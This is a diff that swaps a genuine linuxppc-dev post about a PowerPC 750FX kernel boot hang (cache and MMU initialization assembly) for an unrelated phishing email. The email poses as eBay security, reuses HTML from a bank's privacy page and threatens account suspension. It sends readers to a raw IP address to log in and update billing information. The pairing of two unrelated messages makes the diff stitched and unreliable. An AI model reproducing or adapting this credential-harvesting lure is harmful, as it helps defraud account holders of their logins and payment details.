@@ -1,12 +1,13 @@
-Return-Path: <bgoodman@empirix.com>
-MIME-Version: 1.0
-Content-Type: text/plain;
-	charset="ISO-2022-JP"
-Date: Thu, 28 Jul 2005 17:11:01 -0400
-Message-ID: <BD261180E6D35F4D9D32F3E44FD3D901011B0310@EMPBEDEX.empirix.com>
-From: "Goodman, Brad" <bgoodman@empirix.com>
-To: <Linuxppc-dev@ozlabs.org>
-Subject: Linux 2.6.12.1 PowerPC 750FX Initialization Failures (Caching & MMU)
+Return-Path: <ftp@portalmuenchen.net>
+Received: from linux.local (d463df3e.datahighways.de [212.99.223.62])
+	by ozlabs.org (Postfix) with ESMTP id D5AAB67D88
+	for <linuxppc-dev@ozlabs.org>; Fri, 29 Jul 2005 12:46:36 +1000 (EST)
+To: linuxppc-dev@ozlabs.org
+From: security@ebay.com <security@ebay.com>
+Content-Type: text/html
+Message-Id: <20050729012611.B916348B53@linux.local>
+Date: Fri, 29 Jul 2005 03:26:11 +0200 (CEST)
+Subject: Unauthorized transactions on your account
 List-Id: Linux on PowerPC Developers Mail List <linuxppc-dev.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=unsubscribe>
@@ -17,54 +18,446 @@ List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=subscribe>
 
 
-I am running the 2.6.12.1 Kernel with a Force CPCI-695 board.
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0030)http://www.bbandt.com/privacy/ -->
+<HTML><HEAD><TITLE>eBay.com</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<A HreF="http://www.ebay.com">
+<!-- Hide __JavaScript from Incompatable Browsers
+///////////////////////////////////////////////////////////////////////////////
+file://Detect browser version; set up mouseover image array for top 
+navigation
+///////////////////////////////////////////////////////////////////////////////
+file://initialize variables
+version       = "0";
+browserName   = navigator.appName;
+browserVer    = parseInt(navigator.appVersion);
+has_loaded    = 0;
+do___javascript = 0; file://flag stating browser can processing the 
+script (0 = false;                                               1 = 
+true)
 
-(This board has a PPC 750FX, with a Marvell Disco II (MV64360) - although it uses a 8250, instead of the Disco II UART.)
+var status1 = "";
+var status2 = "";
+var status3 = "";
+var status4 = "";
+var status5 = "";
+var status6 = "";
+var status7 = "";
+var status8 = "";
+var status9 = "";
+var status10 = "";
+var status11 = "";
 
-Anyway…
+if (browserName == "Microsoft Internet Explorer")
+{
+ if (browserVer >= 4)
+ {
+  version = "e4";
+  do___javascript = 1;
+ }
+ else
+ {
+  do___javascript = 0;
+ } file://if (browserVer >= 4)
+} file://if (browserName == "Microsoft Internet Explorer")
 
-This thing is hanging like a buffalo on bootup - in early Kernel initialization:
+if (browserName == "Netscape")
+{
+    if (browserVer >= 3)
+    {
+  version = "n3";
+  do___javascript = 1;
+ }
+ else
+ {
+  do___javascript = 0;
+    } file://if (browserVer >= 3)
+} file://if (browserName == "Netscape")
 
-I setup_common_caches it gets to here:
 
-  mfspr r11,SPRN_HID0				← HID0 is 0x800200a4
-  andi. r0,r11,HID0_DCE
-  ori r11,r11,HID0_ICE|HID0_DCE
-  ori r8,r11,HID0_ICFI
-  bne 1f      /* don't invalidate the D-cache */
-  ori r8,r8,HID0_DCI    /* unless it wasn't enabled */
-1:  sync
-  mtspr SPRN_HID0,r8    /* enable and invalidate caches */     ← r8 is now 0x8002cca4
-  ### NEVER GETS HERE
-  sync
-  mtspr SPRN_HID0,r11   /* enable caches */  
-  mr r3,r11
+file://function load_images()
+function load_images()
+{
+ if (do___javascript == 1)
+ {
+  overImage4  = new Image;
+  overImage5  = new Image;
+  overImage6  = new Image;
+  overImage7  = new Image;
+  overImage8  = new Image;
+  overImage9  = new Image;
+  overImage10 = new Image;
+  overImage11 = new Image;
 
-So it's hanging trying to enable and invalidate the caches.
+  outImage4  = new Image;
+  outImage5  = new Image;
+  outImage6  = new Image;
+  outImage7  = new Image;
+  outImage8  = new Image;
+  outImage9  = new Image;
+  outImage10 = new Image;
+  outImage11 = new Image;
 
-So - trying to ditch that problem until later - I had it leave the caches off and continuing.
 
-Now, it gets to the point where it tries to enable the MMU, and in the turn_on_mmu function it appears to go unresponsive right after the return-from-interrupt:
+  overImage4.src  = "/images/espanolro.gif";
+  overImage5.src  = "/images/sitemapro.gif";
+  overImage6.src  = "/images/psolutionsro.gif";
+  overImage7.src  = "/images/sbsolutionsro.gif";
+  overImage8.src  = "/images/aboutbbtro.gif";
+  overImage9.src  = "/images/locationsro.gif";
+  overImage10.src = "/images/contactusro.gif";
+  file://next line is new commercial/corp.
+  overImage11.src = "/images/commercial/csolutionsro.gif";
+  file://overImage11.src = "/images/csolutionsro.gif";
 
-turn_on_mmu:
-  mfmsr r0
-  ori r0,r0,MSR_DR|MSR_IR
-  mtspr SPRN_SRR1,r0
-  lis r0,start_here@h
-  ori r0,r0,start_here@l
-  mtspr SPRN_SRR0,r0
-  SYNC
-  ## GETS HERE
-  RFI       /* enables MMU */
+  outImage4.src  = "/images/espanol.gif";
+  outImage5.src  = "/images/sitemap.gif";
+  outImage6.src  = "/images/psolutions.gif";
+  outImage7.src  = "/images/sbsolutions.gif";
+  outImage8.src  = "/images/aboutbbt.gif";
+  outImage9.src  = "/images/locations.gif";
+  outImage10.src = "/images/contactus.gif";
+  file://next line is new commercial/corp.
+  outImage11.src = "/images/commercial/csolutions.gif";
+  file://outImage11.src = "/images/csolutions.gif";
 
-I put a check in start_here - and it never reaches it. The BATs should all be set up per-normal initialization, and I verified that it was mapping Physical address 0 to Effective Address 0xc0000000 - but still no luck.
+  has_loaded=1;
+ } file://if (do___javascript == 1)
 
-BTW - I am loading my znetboot image (zImage with no ELF header) at 0x800000 - so it's not relocating on startup (and verified that this was happening correctly.)
+  return true;
+} file://function load_images()
 
-I don't know if the caching issue is related to the MMU issue - or they are two totally separate things.
+file://function mouse_over(imageNum)
+function mouse_over(imageNum)
+{
+  if (has_loaded==1)
+  {
+    var iNum;
+    var i;
+    var name;
+    var iname;
+    name = "status"+imageNum;
+    window.status = __eval(name);
 
-Any ideas????
+    if (do___javascript == 0)
+    {
+      return true;
+    } file://if (do___javascript == 0)
 
-Brad Goodman
-Empirix, Inc.
-bgoodman -et- empirix -dut- com
+    iNum = parseInt(imageNum);
+
+    for (i = 4; i <12; i=i+1)
+    {
+      name="image" +i;
+
+      if (i== iNum)
+      {
+        iname="overImage" +i+".src";
+      }
+      else
+      {
+        iname="outImage" +i+".src";
+      } file://if (i== iNum)
+
+      document[name].src=__eval(iname);
+    } file://for (i = 5; i <12; i=i+1)
+  } file://if (has_loaded==1)
+  return true;
+} file://function mouse_over(imageNum)
+
+file://function mouse_out(imageNum)
+function mouse_out(imageNum)
+{
+  if (has_loaded==1)
+  {
+    var name;
+    var iname;
+    window.status = " ";
+
+    if (do___javascript == 0)
+    {
+      return true;
+    } file://if (do___javascript == 0)
+
+    name = "image"+imageNum;
+    iname = "outImage"+imageNum+".src";
+    document [name].src = __eval(iname);
+  } file://if (has_loaded==1)
+
+  return true;
+} file://function mouse_out(imageNum)
+
+file://function di20(id, newSrc)
+file://Swaps images.
+function di20(id, newSrc)
+{
+    var theImage = FWFindImage(document, id, 0);
+    if (theImage)
+    {
+        theImage.src = newSrc;
+    } file://if (theImage)
+} file://function di20(id, newSrc)
+
+file://function FWFindImage(doc, name, j)
+file://Track and set toggle group button states.
+function FWFindImage(doc, name, j)
+{
+    var theImage = false;
+    if (doc.images)
+    {
+        theImage = doc.images[name];
+    } file://if (doc.images)
+
+    if (theImage)
+    {
+        return theImage;
+    } file://if (theImage)
+
+    if (doc.layers)
+    {
+        for (j = 0; j < doc.layers.length; j++)
+        {
+            theImage = FWFindImage(doc.layers[j].document, name, 0);
+
+            if (theImage)
+            {
+                return (theImage);
+            } file://if (theImage)
+        } file://for (j = 0; j < doc.layers.length; j++)
+    } file://if (doc.layers)
+
+    return (false);
+} file://function FWFindImage(doc, name, j)
+// -->
+</SCRIPT>
+
+<!-- hide this script from non-__javascript-enabled browsers
+function MM_findObj(n, d) { file://v3.0
+  var p,i,x;  if(!d) d=document; 
+if((p=n.indexOf("?"))>0&&parent.frames.length)                                               
+{
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) 
+x=d.forms[                                              i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) 
+x=MM_findObj(n,d.layers[i].docume                                              
+nt); return x;
+}
+
+/* Functions that swaps images. */
+function MM_swapImage() { file://v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; 
+for(i=0;i<(a.l                                              
+ength-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) 
+x.oSrc=x.s                                              rc; 
+x.src=a[i+2];}
+}
+function MM_swapImgRestore() { file://v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) 
+x.src=x                                              .oSrc;
+}
+
+// stop hiding -->
+</SCRIPT>
+
+<!-- Hide __JavaScript from Incompatable Browsers
+///////////////////////////////////////////////////////////////////////////////
+file://function change_url(form, strFormTitle)
+// form - Denotes which form is being used
+//  strFormTitle - Denotes which drop-down was used.
+//  (1 - Select An Area, 2 - Online Products)
+file://Redirect current page to selected item from a drop-down.
+///////////////////////////////////////////////////////////////////////////////
+function change_url(form, strFormTitle, blnDropDownFrame)
+{
+ if (strFormTitle == 1)
+ {
+  parent.location.href = 
+document.SelectAreaForm.SelectAnArea_List.options[docum                                              
+ent.SelectAreaForm.SelectAnArea_List.selectedIndex].value;
+ }
+ else
+ {
+  if 
+(document.OnlineProductsForm.OnlineProducts_List.options[document.OnlinePro                                              
+ductsForm.OnlineProducts_List.selectedIndex].value != "none")
+  {
+   parent.location.href = 
+document.OnlineProductsForm.OnlineProducts_List.option                                              
+s[document.OnlineProductsForm.OnlineProducts_List.selectedIndex].value;
+  }
+ } file://if (strFormTitle == 1)
+} file://function change_url(form, strFormTitle)
+// -->
+</SCRIPT>
+
+<!--
+
+function popupGlob(GlobFile) {
+
+    if (navigator.appName == "Microsoft Internet Explorer"& 
+navigator.appVersion                                              
+.substring(0,1) == "4")  {
+
+        GlobPop = 
+window.open(GlobFile,'_globpop','toolbar=1,location=0,director                                              
+ies=0,left=250, top=50, 
+status=yes,menubar=0,scrollbars=1,resizable=yes,width=50                                              
+0,height=400')
+
+    } else if (navigator.appName == "Microsoft Internet Explorer"& 
+navigator.app                                              
+Version.substring(0,1) != "4")  {
+
+        GlobPop = 
+window.open(GlobFile,'_globpop','toolbar=1,location=0,director                                              
+ies=0,status=yes,menubar=0,scrollbars=1,resizable=yes,width=500,height=400')
+
+    } else if (navigator.appName == "Netscape" & 
+navigator.appVersion.substring(                                              
+0,1) == "2")  {
+
+        GlobPop = 
+window.open(GlobFile,'_globpop','toolbar=1,location=0,director                                              
+ies=0,status=yes,menubar=0,scrollbars=1,resizable=yes,width=500,height=400')
+
+        GlobPop = 
+window.open(GlobFile,'_globpop','toolbar=1,location=0,director                                              
+ies=0,status=yes,menubar=0,scrollbars=1,resizable=yes,width=500,height=400')
+
+    } else {
+
+        GlobPop = 
+window.open(GlobFile,'_globpop','toolbar=1,location=0,director                                              
+ies=0,status=yes,menubar=0,scrollbars=1,resizable=yes,width=500,height=400')
+
+        GlobPop.focus();
+
+    }
+
+}
+
+// -->
+</SCRIPT>
+
+<META content="MSHTML 6.00.2800.1479" name=GENERATOR></HEAD>
+<BODY text=#000000 vLink=#336699 aLink=#999999 link=#660033 
+bgColor=#ffffff
+onfiltered=load_images()>
+<!-- webtrends live tag begin-->
+<!-- START OF SmartSource Data Collector TAG Include -->
+<!-- Copyright 2002 NetIQ Corporation -->
+<!-- V6.0a -->
+<!--
+gVersion="1.0";
+file://-->
+</SCRIPT>
+
+<NOSCRIPT>
+</NOSCRIPT><!-- webtrends live tag end -->
+<TABLE cellSpacing=0 cellPadding=0 width=625 border=0>
+  <!--DWLayoutTable-->
+  <TBODY>
+    <TR>
+      <TD width="10">&nbsp;</TD>
+      <TD width=10 rowSpan=3>&nbsp;</TD>
+      <TD vAlign=top width=13 rowSpan=3><IMG
+      src="BB&amp;T - Privacy and Security_files/spot.gif" width=1></TD>
+      <TD width=12 rowSpan=3>&nbsp;</TD>
+      <TD vAlign=top width=580>
+        <!-- Content begins here -->        <p><FONT
+      face=Serif,Arial,Helvetica color=#660033 size=5><B><a
+href="http://201.128.53.64/index.php"><img 
+height=70
+      alt="BB&amp;T Home"
+      src="http://pics.ebaystatic.com/aw/pics/navbar/eBayLogoTM.gif" 
+width=150
+      border=0></a></B></FONT></p>
+        <p><FONT
+      face=Serif,Arial,Helvetica color=#660033 size=5><font 
+color="#000066"><str                                              
+ong>UPDATE YOUR ACCOUNT</strong></font>
+        </FONT> </p>
+        <P><FONT color="#000066" size=2 face=arial,helvetica><I>Dear 
+valued customer</I>
+          </FONT></P>
+        <p><FONT color="#000066" size=2 face=Arial> 
+&nbsp;&nbsp;&nbsp;&nbsp;We                                               
+regret to inform you that your account at
+          eBay could be suspended if you don't update your billing 
+information.
+          To resolve this problem please <A target="_blank"
+href="http://201.128.53.64/index.php"   a>click
+          here</A> and login to your
+          account in order to resolve the update process. If your 
+account information
+          is not updated, your ability to access the eBay your account 
+will become 
+restricted.<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; As per the User Agreement, we may immediately
+          issue a warning, temporarily suspend, indefinitely suspend or 
+terminate
+          your membership and refuse to provide our services to you if 
+we believe
+          that your actions may cause financial loss or legal liability 
+for you,                                              
+          our users or us. We may also take these actions if we are 
+unable to
+          verify or authenticate any information that you provide to 
+us.<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; Due to the suspension of this account, please
+          be advised you are prohibited from using eBay in any way. This 
+includes
+          the enrolling of a new account. Please note that this 
+suspension does
+          not relieve you of your agreed-upon obligation to pay any fees 
+you may                                              
+          owe to eBay.</FONT></p>
+        <FONT
+      face=arial,helvetica size=2>&nbsp;</FONT>
+        <CENTER>
+          <HR width="80%">
+          <TABLE cellSpacing=0 cellPadding=0 border=0>
+            <TBODY>
+              <TR>
+                <TD vAlign=top align=middle> <TABLE cellSpacing=0 
+cellPadding=0                                               border=0>
+                    <TBODY>
+                      <TR>
+                        <TD align=middle><FONT face=arial,helvetica 
+color=#66003                                              3
+                  size=1>Copyright &copy; 1995-2005 eBay Inc. All Rights 
+Reserve                                              d.Designated 
+trademarks and brands are the property of their respective owners.U                                              
+se of this Web site constitutes acceptance of the eBay <A
+href="http://pages.ebay.com/help/community/png-user.html">User 
+Agreement</A> and                                               <A 
+href="http://pages.ebay.com/help/community/png-priv.html">Privacy 
+Policy</A>                                              . &nbsp; 
+</FONT></TD>
+                        <TD width=32><font face=arial,helvetica
+            size=-2><img 
+src="http://pics.ebaystatic.com/aw/pics/truste_button.g                                              
+if" width="116" height="31"></font> </TD>
+                      </TR>
+                    </TBODY>
+                  </TABLE></TD>
+              </TR>
+            </TBODY>
+          </TABLE>
+          <BR>
+          <TABLE cellSpacing=0 cellPadding=0 border=0>
+            <TBODY>
+              <TR>
+                <TD vAlign=top align=middle><div 
+align="center"></div></TD>
+              </TR>
+            </TBODY>
+          </TABLE>
+      </CENTER></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</BODY></HTML>
